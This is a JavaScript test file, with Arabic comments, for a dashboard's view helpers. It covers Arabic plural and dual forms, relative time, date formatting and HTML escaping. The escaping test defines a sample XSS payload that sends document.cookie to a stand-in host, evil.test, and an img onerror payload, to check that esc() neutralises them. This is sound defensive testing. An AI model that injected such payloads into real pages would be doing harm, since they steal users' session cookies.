// اختبار الصياغة العربية — صيغ العدد خطأ شائع يلاحظه أي قارئ عربي فورًا.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { ago, plural, fmtDate, esc } from '../src/views/layout.js';

const minutesAgo = (n) => new Date(Date.now() - n * 60_000).toISOString();
const daysAgo = (n) => new Date(Date.now() - n * 86400_000).toISOString();

test('صيغ العدد العربية صحيحة', () => {
  assert.equal(plural(1, 'يوم', 'يومين', 'أيام', 'يوم'), 'يوم');
  assert.equal(plural(2, 'يوم', 'يومين', 'أيام', 'يوم'), 'يومين');
  assert.equal(plural(5, 'يوم', 'يومين', 'أيام', 'يوم'), '5 أيام');
  assert.equal(plural(20, 'يوم', 'يومين', 'أيام', 'يوم'), '20 يوم');
});

test('الوقت النسبي يستخدم المثنى لا «2 دقيقة»', () => {
  assert.equal(ago(minutesAgo(2)), 'من دقيقتين');
  assert.equal(ago(minutesAgo(1)), 'من دقيقة');
  assert.equal(ago(minutesAgo(5)), 'من 5 دقائق');
  assert.equal(ago(minutesAgo(120)), 'من ساعتين');
  assert.equal(ago(daysAgo(2)), 'من يومين');
  assert.equal(ago(daysAgo(60)), 'من شهرين');
  assert.ok(!/من 2 /.test(ago(minutesAgo(2))), 'ظهرت صيغة «من 2» الخاطئة');
});

test('التاريخ يُعرض بأشهر عربية وأرقام لاتينية', () => {
  const s = fmtDate('2026-03-15T10:30:00Z');
  assert.match(s, /مارس/);
  assert.ok(!/[٠-٩]/.test(s), 'ظهرت أرقام هندية في التاريخ');
  assert.equal(fmtDate(null), '—');
  assert.equal(fmtDate('ليس تاريخًا'), '—');
});

test('التهريب يبطل حقن السكربتات من عناوين مواقع العملاء', () => {
  // سيناريو حقيقي: موقع عميل مخترق يضع سكربتًا في وسم title، ونحن نعرضه في لوحتنا
  const evil = '<script>fetch("//evil.test?c="+document.cookie)</script>';
  const safe = esc(evil);
  assert.ok(!safe.includes('<script'), 'مرّ وسم script');
  assert.ok(safe.includes('&lt;script&gt;'));
  assert.equal(esc('"><img src=x onerror=alert(1)>'), '&quot;&gt;&lt;img src=x onerror=alert(1)&gt;');
});
